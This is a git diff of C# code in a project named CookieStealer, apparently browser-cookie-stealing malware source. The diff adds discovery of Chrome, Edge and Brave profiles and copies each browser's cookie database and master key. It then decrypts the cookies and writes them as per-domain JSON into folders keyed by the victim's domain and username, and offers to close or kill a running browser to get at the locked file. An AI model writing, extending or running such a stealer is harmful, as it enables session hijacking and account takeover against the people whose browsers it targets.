@@ -1,4 +1,6 @@
-﻿namespace CookieStealer.Cookies;
+﻿using System.Diagnostics;
+
+namespace CookieStealer.Cookies;
 
 using System;
 using System.Net;
@@ -25,28 +27,107 @@ public class Extractor
 
     private const string CookiesFileName = @"Default\Network\Cookies";
     private const string LocalStateFileName = "Local State";
-    private const string DecryptedCookiesFileName =  @"raw\Cookies_Decrypted";
+    private const string DecryptedCookiesFileName =  "Cookies_Decrypted";
+    private string _workingDirectory;
+
+    private readonly string _userDomainName = Environment.UserDomainName;
+    private readonly string _userName = Environment.UserName;
+    private Dictionary<string, string> _discoveredBrowsers = new Dictionary<string, string>();
+    
 
     public Extractor()
     {
-        if (!Directory.Exists("cookies"))
+        var localAppDataPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+        var appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
+        
+        var browsersList = new Dictionary<string, string>
         {
-            Directory.CreateDirectory("cookies");
+            {"Chrome", @$"{localAppDataPath}\Google\Chrome\User Data"},
+            {"MsEdge", @$"{localAppDataPath}\Microsoft\Edge\User Data"},
+            // {"Firefox", @$"{appDataPath}\Mozilla\Firefox\Profiles\<someString>.default"}, // different approach
+            // {"Opera", @$"{appDataPath}\Opera Software\Opera Stable\User Data"},
+            // {"OperaGX", @$"{appDataPath}\Opera Software\Opera GX Stable\User Data"}, // different location
+            {"Brave", @$"{localAppDataPath}\BraveSoftware\Brave-Browser\User Data"},
+        };
+
+        foreach (var browser in browsersList.Where(browser => Path.Exists(browser.Value)))
+        {
+            _discoveredBrowsers.Add(browser.Key, browser.Value);
         }
         
-        if (!Directory.Exists("raw"))
-        {
-            Directory.CreateDirectory("raw");
-        }
         
+        var now = DateTime.Now;
+        var currentTime = now.ToString("ddMMyyHHmm");
+
+        _workingDirectory = @$"extracted\{_userDomainName}\{_userName}\{currentTime}";
+
+        foreach (var path in _discoveredBrowsers.Keys
+                     .Select(browserName =>
+                         @$"{_workingDirectory}\{browserName}\database")
+                     .Where(path => !Directory.Exists(path)))
+        {
+            Directory.CreateDirectory(path);
+        }
         
     }
-
-    public static IEnumerable<Cookie> GetCookies(string baseFolder)
+    
+    
+    public void GrabAndRun()
     {
-        var key = GetKey(baseFolder);
-        var cookies = ReadFromDb(baseFolder, key);
-        return cookies;
+        foreach (var browser in _discoveredBrowsers)
+        {
+            var currentDirectory = Path.Combine(_workingDirectory + @$"\{browser.Key}", "database");
+            var key = GetKey(browser.Value);
+            File.WriteAllBytes(@$"{currentDirectory}\master.key", key);
+            var cookiePath = Path.Combine(browser.Value, CookiesFileName);
+
+            try
+            {
+                File.Copy(cookiePath, currentDirectory + @"\Cookie");
+            }
+            catch (IOException e)
+            {
+                Console.WriteLine($"Can't copy Cookie file because browser is currently running. Do you want to terminate {browser.Key}? [Y/N]");
+                var ans1 = Console.ReadKey();
+
+                switch (ans1.KeyChar)
+                {
+                    case 'y':
+                        Console.Clear();
+                        var processes = Process.GetProcessesByName(browser.Key.ToLower());
+
+                        foreach (var process in processes)
+                        {
+                            process.CloseMainWindow();
+                            if (!process.WaitForExit(3000))
+                            {
+                                Console.WriteLine("Couldn't terminate the process. Do you want to kill it? [Y/N]");
+                                var ans2 = Console.ReadKey();
+
+                                switch (ans2.KeyChar)
+                                {
+                                    case 'y':
+                                        process.Kill();
+                                        Thread.Sleep(500);
+                                        break;
+                                    case 'n':
+                                        break;
+                                }
+                                
+                            }
+                        }
+                        
+                        File.Copy(cookiePath, currentDirectory + @"\Cookie");
+                        break;
+                        
+                    case 'n':
+                        Console.Clear();
+                        break;
+                }
+                
+            }
+
+        }
     }
     
     private static byte[] GetKey(string baseFolder)
@@ -62,15 +143,27 @@ public class Extractor
         return masterKey;
     }
     
-    private static IEnumerable<Cookie> ReadFromDb(string baseFolder, byte[] key)
+    public void DecryptAndExtract()
+    {
+        foreach (var browser in _discoveredBrowsers)
+        {
+            var currentDirectory = Path.Combine(_workingDirectory + $"\\{browser.Key}", "database");
+            var key = File.ReadAllBytes(currentDirectory + "\\master.key");
+            ReadFromDb(currentDirectory, key);
+            ExtractCookies(currentDirectory, currentDirectory + "\\..");
+        }
+    }
+    
+    private void ReadFromDb(string cookieDirectory, byte[] key)
     {
         ICollection<Cookie> result = new List<Cookie>();
         
-        var dbFileName = Path.Combine(baseFolder, CookiesFileName);
+        var dbFileName = cookieDirectory + "\\Cookie";
+        var dbCopyFileName = Path.Combine(cookieDirectory, DecryptedCookiesFileName);
         
-        File.Copy(dbFileName, DecryptedCookiesFileName, true);
+        File.Copy(dbFileName, dbCopyFileName, true);
 
-        using var connection = new SqliteConnection($"Data Source={DecryptedCookiesFileName}");
+        using var connection = new SqliteConnection($"Data Source={dbCopyFileName}");
     
         connection.Open();
 
@@ -107,6 +200,8 @@ public class Extractor
                 var name = reader["name"].ToString();
                 if (string.IsNullOrEmpty(name))
                 {
+                    // TODO
+                    // ISSUE WITH A FIELD / APPEND DOMAIN AND TIME TO LOG 
                     continue;
                 }
 
@@ -135,7 +230,6 @@ public class Extractor
             }
         }
         Console.WriteLine("Done.");
-        return result;
     }
 
     private static string DecryptCookie(byte[] masterKey, byte[] cookie)
@@ -153,10 +247,9 @@ public class Extractor
     }
     
     
-    
-    public static void ExtractCookies(string cookiesPath)
+    private static void ExtractCookies(string cookiesPath, string extractionPath)
     {
-        using var connection = new SqliteConnection($"Data Source={cookiesPath}");
+        using var connection = new SqliteConnection($"Data Source={cookiesPath + "\\Cookie"}");
         connection.Open();
 
         var command = connection.CreateCommand();
@@ -210,7 +303,7 @@ public class Extractor
         {
             var json = Newtonsoft.Json.JsonConvert.SerializeObject(cookies[domain],
                 Newtonsoft.Json.Formatting.Indented);
-            var path = @$"cookies\{domain}.json";
+            var path = Path.Combine(extractionPath, $"{domain}.json");
             File.WriteAllText(path, json);
         }
     }
